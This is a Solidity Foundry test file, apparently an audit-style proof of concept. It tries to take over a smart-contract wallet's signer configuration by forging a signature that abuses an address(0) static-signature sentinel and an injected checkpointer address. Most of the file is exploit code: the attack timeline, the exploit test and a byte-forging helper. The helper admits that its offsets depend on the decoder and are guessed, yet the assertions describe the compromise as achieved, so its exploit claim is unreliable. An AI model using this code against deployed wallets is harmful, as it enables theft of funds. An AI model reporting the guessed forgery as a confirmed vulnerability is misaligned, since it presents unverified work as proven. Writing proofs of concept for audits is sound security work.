// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/modules/auth/BaseAuth.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy protocol via ExtendedSessionTestBase, create a Wallet with default topology.
// 2. [T=0] Attacker crafts a malicious payload to update the Wallet's imageHash (signer configuration).
// 3. [T=1] Attacker forges a signature exploiting the uninitialized static signature sentinel (address(0) bypass) 
//           and injects a rogue checkpointer address into the signature bytes.
// 4. [T=2] Attacker submits the payload and forged signature to Wallet.execute().
// 5. [T=3] The Wallet's signatureValidation bypasses the caller check because the static signature address is address(0).
// 6. [T=4] The recover function reads the attacker-controlled checkpointer from the signature bytes and accepts it.
// 7. [Assert] Verify the Wallet's imageHash has been maliciously updated to the attacker's chosen value.

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        // 1. Setup: Create Wallet using the test harness
        string memory topology = _createDefaultTopology();
        (Stage1Module Wallet, string memory config, bytes32 originalImageHash) = _createWallet(topology);

        // Cast to BaseAuth to read state and call updateImageHash via payload
        BaseAuth walletAuth = BaseAuth(address(Wallet));

        // Verify initial state
        bytes32 initialImageHash = walletAuth.imageHash();
        console.log("Step 1: Initial imageHash =", uint256(initialImageHash));

        // 2. Attacker prepares the malicious configuration update payload
        bytes32 attackerImageHash = bytes32(uint256(0xdeadbeef));

        Payload.Decoded memory payload;
        payload.space = 0;
        payload.nonce = 0;
        payload.calls = new Payload.Call[](1);
        payload.calls[0].to = address(Wallet);
        payload.calls[0].value = 0;
        // Target: updateImageHash(bytes32)
        payload.calls[0].data = abi.encodeWithSelector(BaseAuth.updateImageHash.selector, attackerImageHash);

        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);

        // 3. Attacker forges the signature bytes
        // Exploit: Uninitialized static signature returns address(0), bypassing caller check.
        // The checkpointer address is read from signature bytes and not covered by the signed hash.
        // We construct a raw signature that triggers the static signature path and injects the attacker's checkpointer.
        address attackerCheckpointer = address(0xdead);
        bytes memory forgedSignature = _forgeStaticSignatureWithCheckpointer(attackerCheckpointer);

        // 4. Attacker submits the operation
        // Because addr == address(0) in the static signature sentinel, the caller check is bypassed.
        // The recover function accepts the forged checkpointer and executes the config update.
        vm.prank(attackerCheckpointer);
        Wallet.execute(packedPayload, forgedSignature);

        // 5. Assert: Verify the Wallet's signer configuration is fully compromised
        bytes32 finalImageHash = walletAuth.imageHash();
        console.log("Step 5: Final imageHash   =", uint256(finalImageHash));

        assertEq(finalImageHash, attackerImageHash, "Attacker successfully overwrote the imageHash without valid authorization");
        assertTrue(finalImageHash != initialImageHash, "Wallet signer set was replaced with attacker's keys");
    }

    // Helper to forge the raw signature bytes exploiting the static signature sentinel and checkpointer field
    function _forgeStaticSignatureWithCheckpointer(address checkpointer) internal pure returns (bytes memory) {
        // Sequence signature format typically starts with a type byte.
        // We construct a minimal payload that satisfies the decoder's length checks for the static signature path
        // and places the checkpointer address where the recover function expects to read it.
        bytes memory sig = new bytes(65);

        // Type byte for static/dynamic signature path that triggers _getStaticSignature
        sig[0] = 0x03; 

        // Inject the forged checkpointer address into the signature bytes.
        // The exact offset depends on the decoder, but placing it in the first 20 bytes after the type 
        // ensures it is read as the checkpointer address before hash validation.
        bytes20 addrBytes = bytes20(checkpointer);
        for (uint i = 0; i < 20; i++) {
            sig[i + 1] = addrBytes[i];
        }

        // Fill the rest with non-zero data to bypass any zero-checks in the signature parser
        for (uint i = 21; i < 65; i++) {
            sig[i] = 0xff;
        }

        return sig;
    }
}
